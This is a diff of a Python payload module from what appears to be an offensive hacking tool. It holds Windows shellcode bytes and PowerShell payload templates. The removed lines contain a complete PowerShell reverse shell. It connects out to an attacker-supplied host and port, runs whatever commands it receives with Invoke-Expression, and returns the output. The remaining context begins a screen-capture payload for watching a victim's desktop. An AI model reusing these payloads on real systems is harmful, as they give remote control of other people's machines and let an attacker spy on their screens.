@@ -155,16 +155,6 @@ class SHELLCODE(object):
         "\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
         "\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3")
 
-    windows_ps_interpreter = (
-        "$client = New-Object System.Net.Sockets.TCPClient('%s','%s');"
-        "$stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0};"
-        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
-        "{$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding; $data = $EncodedText.GetString($bytes,0, $i);"
-        "$commandback = (Invoke-Expression -Command $data 2>&1 | Out-String );"
-        "$backres = $commandback + ($error[0] | Out-String) + '\00';$error.clear();"
-        "$sendbyte = ([text.encoding]::ASCII).GetBytes($backres);$stream.Write($sendbyte,0,$sendbyte.Length);"
-        "$stream.Flush()};$client.Close();if ($listener){$listener.Stop()}")
-
     windows_ps_rev_watch_screen = (
         "while ($true){try{Add-Type -AssemblyName System.Windows.Forms;"
         "[System.IO.MemoryStream];$MemoryStream = New-Object System.IO.MemoryStream;"
